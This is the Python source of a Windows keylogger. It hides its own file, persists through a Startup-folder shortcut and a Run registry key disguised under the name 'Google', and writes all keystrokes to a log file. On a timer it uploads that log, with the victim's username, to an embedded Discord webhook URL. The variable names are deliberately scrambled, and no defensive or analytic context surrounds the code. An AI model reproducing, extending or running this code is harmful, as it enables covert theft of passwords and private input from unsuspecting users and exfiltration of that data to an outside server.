import os, time, ctypes,requests, winreg,win32com.client,sys
from pynput import keyboard

# Example usage:
vVbSdP_jM = 'https://discord.com/api/webhooks/1188180601996587168/YKw8ZWYZqyPaYoCAMmnRJsFCUMryzLJvVh81Vg2Xr5r-G-UeCewQssrAmsrUW20pU3fv'
LmWgYm_E = ""
aBcD_eFgH = 300  # Set the delay duration in seconds
xYzZaB_cD = sys.argv[0]  # Script Path with file
os.system(f"attrib +h {xYzZaB_cD}")  # Set hidden attribute on Windows
os.chmod(xYzZaB_cD, 0o0700)
uSeR_nAmE = os.environ.get('USERNAME')
fIlE_nAmE = os.path.basename(xYzZaB_cD)
dEsTiNaTiOn_PaTh = f'C:/Users/{uSeR_nAmE}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/'

lOg_PaTh = f"C:/Users/{uSeR_nAmE}/Documents/log.txt" #File KEy

shortcut_path = os.path.join(dEsTiNaTiOn_PaTh, "log.lnk")

shell = win32com.client.Dispatch("WScript.Shell")
shortcut = shell.CreateShortCut(shortcut_path)
shortcut.Targetpath = xYzZaB_cD
shortcut.Save()


def aDd_T0_StRtUp(shortct_path): #Make the File Hidden
    user = winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
    winreg.SetValueEx(user, "Google", 0, winreg.REG_SZ, f"{shortcut_path}") 
def sNd_WbHk_wTh_Fl(vVbSdP_jM, file_path): #Send to discord file
    with open(file_path, 'rb') as file:
        payload = {"content": f"User: {uSeR_nAmE}"}
        files = {'file': (file_path, file)}
        response = requests.post(vVbSdP_jM, data=payload, files=files)
        if response.status_code == 200:
            file.close()

def sNd_Kylgs_t0_Dscrd(): #Indicate the timer and if the file exceed 2mb send it to discord
    global LmWgYm_E
    if LmWgYm_E:
        
        file_size = os.path.getsize(lOg_PaTh) / (1024 * 1024)  # Convert bytes to megabytes

        if file_size >= 2 and time_remaining == 0 :
            sNd_WbHk_wTh_Fl(vVbSdP_jM, lOg_PaTh)
            os.remove(lOg_PaTh)

        else:
            sNd_WbHk_wTh_Fl(vVbSdP_jM, lOg_PaTh)

        LmWgYm_E = ""
    return
def gT_CpSlCk_StAtE():
    return ctypes.windll.user32.GetKeyState(0x14)

def hNdL_SpC_kYs(key): #Special Keys
    special_characters = {
        keyboard.Key.backspace: "\n [BackSpace]\n",
        keyboard.Key.enter: "\n [Enter]\n",
        keyboard.Key.space: " ",
        keyboard.Key.ctrl_l: "\n [Ctrl]\n",
    }
    
    if key in special_characters:
        pass
        # print(f"{special_characters[key]} key pressed")
        return special_characters[key]

    if key == keyboard.Key.caps_lock:
        capslock_state = "[CAPSLOCK ON]" if gT_CpSlCk_StAtE() else "[CAPSLOCK OFF]"

    return None

def hNdL_NmPd_kYs(key): #Numpad Keys
    numpad_key_mapping = {
        96: "0",
        97: "1",
        98: "2",
        99: "3",
        100: "4",
        101: "5",
        102: "6",
        103: "7",
        104: "8",
        105: "9",
        106: "10",
        # Add more mappings as needed
    }

    if hasattr(key, 'vk') and key.vk in numpad_key_mapping:
        return numpad_key_mapping[key.vk]

def hNdL_Rg_Kys(key): #Regular Keys
    try:
        char = format(key.char)
        capslock_state = gT_CpSlCk_StAtE()

        if capslock_state:
            char = char.upper()
        elif keyboard.Key.shift:
            pass
        else:
            char = char.lower()
        
        return char
    except AttributeError:

        return None

def Ky_PrSd(key): #When pressing keys
    global LmWgYm_E

    with open(lOg_PaTh, 'a') as log_file:
        special_key_result = hNdL_SpC_kYs(key)
        numpad_key_result = hNdL_NmPd_kYs(key)

        if special_key_result is not None:
            log_file.write(special_key_result)
            LmWgYm_E += special_key_result
        elif numpad_key_result is not None:
            log_file.write(numpad_key_result)
            LmWgYm_E += numpad_key_result
        else:
            regular_key_result = hNdL_Rg_Kys(key)
            if regular_key_result is not None:
                log_file.write(regular_key_result)
                LmWgYm_E += regular_key_result


# The following line was missing in my previous responses
keyboard.Listener(on_press=Ky_PrSd)

if __name__ == "__main__":
    listener = keyboard.Listener(on_press=Ky_PrSd)
    aDd_T0_StRtUp(shortcut_path)
    listener.start()
    
   
    try:    

        while True:

            start_time = time.time()

            while True:
                time_elapsed = time.time() - start_time
                time_remaining = max(0, aBcD_eFgH - time_elapsed)
                print(f"Time remaining: {time_remaining:.1f} seconds")
                if time_remaining == 0:
                    sNd_Kylgs_t0_Dscrd()
                    break

                time.sleep(1)  # Sleep for 1 second to avoid high CPU usage

            print("\nTimer finished. Restarting...\n")
            

    except KeyboardInterrupt:
        pass
    finally:
        listener.stop()
        listener.join()



